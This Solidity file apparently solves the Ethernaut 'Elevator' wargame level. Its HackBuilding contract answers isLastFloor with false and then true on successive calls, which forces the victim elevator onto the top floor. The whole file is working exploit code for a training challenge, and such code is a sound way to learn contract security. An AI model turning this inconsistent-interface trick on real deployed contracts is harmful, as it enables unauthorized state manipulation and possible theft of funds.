pragma solidity ^0.5;

import '../levels/Elevator.sol';

contract HackBuilding is Building {
  Elevator internal victim;
  bool internal flip;

  constructor (address _victimAddress) public {
    victim = Elevator(_victimAddress);
  }

  function isLastFloor(uint) public returns (bool) {
      // first call
      if (!flip) {
          flip = true;
          return false;
      } else {
          flip = false;
          return true;
      }
  }

  function hack() public {
      victim.goTo(1);
  }
}
